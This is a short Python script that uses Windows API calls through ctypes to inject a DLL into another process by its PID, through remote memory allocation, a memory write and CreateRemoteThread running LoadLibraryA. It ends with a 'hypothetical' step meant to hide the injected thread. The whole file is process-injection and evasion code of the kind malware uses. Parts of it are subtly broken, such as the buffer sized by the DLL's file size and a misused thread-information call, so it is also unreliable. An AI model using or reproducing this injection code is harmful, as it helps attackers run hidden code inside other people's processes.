import ctypes
import os

# Name of the DLL to inject
dll_name = "mydll.dll"

# PID of the process to inject the DLL into
pid = 1234

# Get the size of the DLL
dll_size = os.path.getsize(dll_name)

# Get a handle to the process
h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)

# Allocate space for the DLL path
arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, dll_size, 0x1000, 0x40)

# Write the DLL path to the allocated space
ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, dll_name, dll_size, 0)

# Get the address of the LoadLibraryA function
h_kernel32 = ctypes.windll.kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = ctypes.windll.kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

# Create a new thread that will call LoadLibraryA with the DLL path as its argument
h_thread = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, None)

# Unlink the thread from the PEB
# NOTE: This is a hypothetical example and may not work in all cases
peb = ctypes.c_void_p()
ctypes.windll.ntdll.NtQueryInformationThread(h_thread, 0, ctypes.byref(peb), ctypes.sizeof(peb), None)
peb.value = 0
ctypes.windll.ntdll.NtSetInformationThread(h_thread, 0, ctypes.byref(peb), ctypes.sizeof(peb))
